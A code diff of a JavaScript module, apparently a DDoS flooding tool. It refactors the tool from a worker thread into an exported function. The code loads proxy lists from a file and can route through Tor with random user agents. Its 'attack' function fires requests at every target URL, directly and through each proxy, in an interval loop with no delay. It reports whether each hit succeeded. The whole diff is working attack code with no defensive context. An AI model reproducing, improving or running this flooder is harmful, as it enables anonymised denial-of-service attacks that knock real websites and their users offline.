@@ -1,18 +1,12 @@
 const proxy =         require('tor-request');
-const request =       require('request');   
-const fs = require('fs').promises;  
+const request =       require('request');
+const fs =             require('fs').promises;
 const randomUseragent = require('random-useragent');
-const {
-     parentPort, workerData
-  } =                   require('worker_threads');
-const { urls, tor } = workerData;
 
-(async () => {
-    let proxyList = new Set((await fs.readFile('proxy.txt', 'utf8')).split('\n'));
+module.exports = async ({ urls, tor, setState }) => {
+    let proxyList = (await fs.readFile('proxy.txt', 'utf8')).split('\n');
 
-    setInterval(async () => {
-        proxyList = new Set((await fs.readFile('proxy.txt', 'utf8')).split('\n'));
-    }, 60000);
+    setInterval(async () => proxyList = (await fs.readFile('proxy.txt', 'utf8')).split('\n'), 60000);
 
     const attack = (method, url, proxy) => {
         try {
@@ -26,11 +20,13 @@ const { urls, tor } = workerData;
     
             if (proxy) params.proxy = `http://${proxy}`;
     
-            method(params, (err, res) => {
-                if (err) return parentPort.postMessage({ url, success: 'unsuccessfully' });
-                if (res?.statusCode && res?.statusCode < 400) return parentPort.postMessage({ url, success: 'successfully' });
+            return method(params, (err, res) => {
+                if (err) return setState({ url, success: 'unsuccessfully' });
+                if (res?.statusCode && res?.statusCode < 400) setState({ url, success: 'successfully' });
             });
-        } catch(err) {}
+        } catch(err) {
+            return setState({ url, success: 'unsuccessfully' });
+        }
     }
     
     if (tor) {
@@ -38,21 +34,25 @@ const { urls, tor } = workerData;
             for (const url of urls) {
                 attack(proxy.request, url);
 
-                for (const proxy of proxyList) {
+                if (proxyList?.length) for (const proxy of proxyList) {
                     attack(proxy.request, url, proxy);
                 }
             };
+
+            return;
         });
     } else {
         setInterval(() => {
             for (const url of urls) {
                 attack(request, url);
 
-                for (const proxy of proxyList) {
+                if (proxyList?.length) for (const proxy of proxyList) {
                     attack(request, url, proxy);
                 }
             }
+
+            return;
         });
     }
-})()
+};
 
